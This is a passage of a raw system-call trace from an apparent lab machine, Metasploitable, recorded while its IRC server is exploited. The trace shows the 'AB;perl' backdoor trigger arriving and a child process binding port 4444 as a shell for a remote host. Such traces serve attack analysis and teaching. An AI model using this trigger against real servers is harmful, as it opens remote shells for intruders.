CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
5499  07:09:19.858030 close(10)         = 0
5499  07:09:19.858039 munmap(0xb7d81000, 4096) = 0
5499  07:09:19.858066 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 10
5499  07:09:19.858200 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2b68) = -1 EINVAL (Invalid argument)
5499  07:09:19.858215 _llseek(10, 0, 0xbf9c2bb0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5499  07:09:19.858243 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2b68) = -1 EINVAL (Invalid argument)
5499  07:09:19.858254 _llseek(10, 0, 0xbf9c2bb0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5499  07:09:19.858264 fcntl64(10, F_SETFD, FD_CLOEXEC) = 0
5499  07:09:19.858316 setsockopt(10, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
5499  07:09:19.858351 bind(10, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
5499  07:09:19.858376 listen(10, 5)     = 0
5499  07:09:19.858428 accept(10,  <unfinished ...>
5498  07:09:19.869772 exit_group(0)     = ?
5496  07:09:19.869849 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 5498
5496  07:09:19.869866 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5496  07:09:19.869877 --- SIGCHLD (Child exited) @ 0 (0) ---
5496  07:09:19.869885 waitpid(-1, 0xbf83dbb8, WNOHANG) = -1 ECHILD (No child processes)
5496  07:09:19.869896 sigreturn()       = ? (mask now [])
5496  07:09:19.869912 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
5496  07:09:19.869967 exit_group(0)     = ?
4519  07:09:19.870069 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 5496
4519  07:09:19.870081 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:09:19.870095 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:09:19.870106 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:09:19.870116 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:09:19.870134 send(8, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:09:19.870198 time(NULL)        = 1495624159
4519  07:09:19.870208 time(NULL)        = 1495624159
4519  07:09:19.870222 gettimeofday({1495624159, 870245}, NULL) = 0
4519  07:09:19.870271 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:09:19.870302 clock_gettime(CLOCK_MONOTONIC, {969, 687315009}) = 0
4519  07:09:19.870314 gettimeofday({1495624159, 870318}, NULL) = 0
4519  07:09:19.870325 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 980000})
4519  07:09:19.889564 clock_gettime(CLOCK_MONOTONIC, {969, 706582912}) = 0
4519  07:09:19.889584 recv(4, "PRIVMSG  #testit Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 54
4519  07:09:19.889625 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889642 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889657 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889671 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889684 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889698 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889712 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889725 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889739 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889752 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889771 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889785 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889798 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889812 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889825 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889838 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889852 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889865 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889878 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889893 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889907 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889921 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.889941 gettimeofday({1495624159, 889956}, NULL) = 0
4519  07:09:19.889964 select(1024, [2 3 4 5 6 7 8 9], [6], NULL, {1, 0}) = 1 (out [6], left {1, 0})
4519  07:09:19.890080 clock_gettime(CLOCK_MONOTONIC, {969, 707093490}) = 0
4519  07:09:19.890092 send(6, ":bot1!bot1@Test-CAD1B1ED PRIVMSG #testit :Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\r\n", 80, 0) = 80
4519  07:09:19.890122 time(NULL)        = 1495624159
4519  07:09:19.890131 time(NULL)        = 1495624159
4519  07:09:19.890142 gettimeofday({1495624159, 890145}, NULL) = 0
4519  07:09:19.890152 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:09:19.890180 clock_gettime(CLOCK_MONOTONIC, {969, 707192573}) = 0
4519  07:09:19.890190 gettimeofday({1495624159, 890193}, NULL) = 0
4519  07:09:19.890200 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
5499  07:09:19.955144 <... accept resumed> {sa_family=AF_INET, sin_port=htons(46833), sin_addr=inet_addr("10.0.2.4")}, [16]) = 11
5499  07:09:19.955205 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1b58) = -1 EINVAL (Invalid argument)
5499  07:09:19.955220 _llseek(11, 0, 0xbf9c1ba0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5499  07:09:19.955232 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1b58) = -1 EINVAL (Invalid argument)
5499  07:09:19.955242 _llseek(11, 0, 0xbf9c1ba0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5499  07:09:19.955252 fcntl64(11, F_SETFD, FD_CLOEXEC) = 0
5499  07:09:19.955295 close(10)         = 0
5499  07:09:19.955363 dup(11)           = 10
5499  07:09:19.955376 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c29f8) = -1 EINVAL (Invalid argument)
5499  07:09:19.955387 _llseek(10, 0, 0xbf9c2a40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5499  07:09:19.955397 fstat64(10, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
5499  07:09:19.955416 dup2(10, 1)       = 1
5499  07:09:19.955427 close(10)         = 0
5499  07:09:19.955567 fcntl64(1, F_SETFD, 0) = 0
5499  07:09:19.955593 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c29c8) = -1 EINVAL (Invalid argument)
5499  07:09:19.955604 _llseek(1, 0, 0xbf9c2a10, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5499  07:09:19.955664 dup(11)           = 10
5499  07:09:19.955675 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c29f8) = -1 EINVAL (Invalid argument)
5499  07:09:19.955686 _llseek(10, 0, 0xbf9c2a40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5499  07:09:19.955696 fstat64(10, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
5499  07:09:19.955712 dup2(10, 0)       = 0
5499  07:09:19.955722 close(10)         = 0
5499  07:09:19.955731 fcntl64(0, F_SETFD, 0) = 0
5499  07:09:19.955744 fcntl64(0, F_SETFD, 0) = 0
5499  07:09:19.955760 read(0,  <unfinished ...>
4519  07:09:20.439674 <... select resumed> ) = 1 (in [9], left {0, 450000})
4519  07:09:20.439714 clock_gettime(CLOCK_MONOTONIC, {970, 256742395}) = 0
4519  07:09:20.439743 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:09:20.439771 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439797 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439812 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439826 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439839 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439853 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439867 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439880 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439893 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439907 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439920 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439934 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439947 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439960 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439973 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.439987 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.440000 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.440013 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.440026 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.440040 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.440054 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.440104 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:20.440139 gettimeofday({1495624160, 440142}, NULL) = 0
4519  07:09:20.440165 select(1024, [2 3 4 5 6 7 8 9], [], NULL, {1, 0}) = 1 (in [8], left {1, 0})
4519  07:09:20.440208 clock_gettime(CLOCK_MONOTONIC, {970, 257221044}) = 0
4519  07:09:20.440233 recv(8, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:09:20.440247 getsockopt(8, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:09:20.440267 send(8, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:09:20.440283 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:09:20.440320 close(8)          = 0
4519  07:09:20.440333 time(NULL)        = 1495624160
4519  07:09:20.440343 time(NULL)        = 1495624160
4519  07:09:20.440356 gettimeofday({1495624160, 440360}, NULL) = 0
4519  07:09:20.440368 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:09:20.440396 clock_gettime(CLOCK_MONOTONIC, {970, 257408488}) = 0
4519  07:09:20.440406 gettimeofday({1495624160, 440409}, NULL) = 0
4519  07:09:20.440416 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
5499  07:09:20.486399 <... read resumed> "", 4096) = 0
5499  07:09:20.486532 close(11)         = 0
5499  07:09:20.486725 exit_group(0)     = ?
